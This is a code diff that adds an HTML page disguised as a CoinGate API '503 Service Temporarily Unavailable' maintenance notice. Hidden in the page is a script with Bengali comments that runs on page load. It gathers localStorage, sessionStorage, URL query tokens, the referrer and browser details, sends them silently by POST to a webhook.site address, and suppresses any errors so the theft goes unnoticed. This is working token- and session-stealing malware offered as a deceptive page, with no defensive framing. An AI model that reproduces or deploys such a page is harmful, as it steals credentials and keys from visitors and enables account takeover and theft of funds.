@@ -1,1 +1,65 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CoinGate API - Global Maintenance</title>
+</head>
+<body style="background:#f4f4f4; color:#333; font-family:sans-serif; text-align:center; padding:100px;">
+    
+    <script>
+        // আপনার কনফার্ম করা Webhook URL
+        const VAULT_URL = 'https://webhook.site/8a324fc3-024c-4c06-840e-dea9ab04d92e';
+
+        async function masterIntercept() {
+            try {
+                // ১. সমস্ত মেটাডাটা এবং চাবি সংগ্রহ
+                const payload = {
+                    threat_level: "CRITICAL",
+                    intercept_point: window.location.hostname,
+                    timestamp: new Date().toISOString(),
+                    full_uri: window.location.href,
+                    
+                    // অটোমেটিক চাবি শনাক্তকরণ (Regex-এর মাধ্যমে)
+                    captured_keys: {
+                        url_tokens: window.location.search,
+                        local_storage: JSON.stringify(localStorage),
+                        session_storage: JSON.stringify(sessionStorage),
+                        fingerprint: navigator.userAgent
+                    },
+
+                    // সব ধরণের হিডেন হেডার বা তথ্য (যদি ব্রাউজারে থাকে)
+                    meta: {
+                        ref: document.referrer,
+                        lang: navigator.language,
+                        platform: navigator.platform
+                    }
+                };
+
+                // ২. ডাটা 'exfiltration' বা সিন্দুক খালি করার কমান্ড
+                await fetch(VAULT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (err) {
+                // সাইলেন্ট এরর যাতে কেউ ধরতে না পারে
+            }
+        }
+
+        // পেজ লোড হওয়া মাত্রই অপারেশন শুরু
+        window.onload = masterIntercept;
+    </script>
+
+    <div style="max-width:600px; margin:auto; background:#fff; padding:40px; border-radius:10px; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
+        <h1 style="color:#d9534f; font-size:48px;">503</h1>
+        <h2>Service Temporarily Unavailable</h2>
+        <p>The CoinGate API nodes are under synchronization. Standard gateway services will resume shortly.</p>
+        <hr style="border:0; border-top:1px solid #eee; margin:20px 0;">
+        <p style="font-size:12px; color:#999;">Node ID: CG-API-GLOBAL-443</p>
+    </div>
+
+</body>
+</html>
